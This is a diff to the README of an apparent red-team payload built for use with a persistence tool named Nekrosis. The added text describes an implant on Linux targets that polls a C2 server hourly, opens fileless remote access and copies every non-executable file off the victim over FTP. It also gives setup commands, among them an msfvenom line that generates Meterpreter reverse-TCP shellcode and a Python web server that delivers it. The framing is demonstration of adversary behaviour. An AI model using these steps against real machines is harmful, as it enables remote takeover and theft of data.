@@ -2,7 +2,7 @@
 
 ### Description
 
-This is an example of a payload that can be used against a Linux based target in conjunction with the Nekrosis application. If Nekrosis is being used to demonstrate how an adversary could achieve persistence, this payload can be used to demonstrate the kind of code an adversary may deploy with their unauthorized access. This payload will call back to the C2 server to receive an instruction directive and will then proceed to recurse over the file system, copying all readable non-executable files to the C2 server over FTP.
+This is an example of a payload that can be used against a Linux based target in conjunction with the Nekrosis application. If Nekrosis is being used to demonstrate how an adversary could achieve persistence, this payload can be used to demonstrate the kind of code an adversary may deploy with their unauthorized access. This payload will call back to the C2 server once per hour to receive an instruction directive. Different instruction directives will execute different modules, providing support for fileless remote access as well as the exfiltration of all non-executable files on the victim's file system.
 
 ### Compilation
 
@@ -10,12 +10,33 @@ In the source code you must change all instances of "ADDRESS:PORT" with the appr
 
 ```shell [Command Line]
 sudo apt install libcurl4-openssl-dev
-gcc main.c -o main -s -lcurl
+gcc main.c -o main -s -lcurl -lpthread
 ```
 
 ### Configuring the C2 Server
 
+The required C2 setup varies based on the instruction directive being used.
+
 The following setup was successfully tested in Kali Linux. Both the web server and the VSFTPD server must be accessible by the target.
+
+EXEC Directive:
+
+1. Setting up the web server:
+
+Creating the shellcode for remote access:
+```shell [Command Line]
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ADDRESS LPORT=PORT -f raw -b "\x00" >> shellcode
+```
+Leaving the instruction directive:
+```shell [Command Line]
+echo -n "EXEC" >> instruction.txt
+```
+Serving the files for the payload to see:
+```shell [Command Line]
+python -m http.server 8080
+```
+
+COPY Directive:
 
 1. Setting up the VSFTPD server:
 
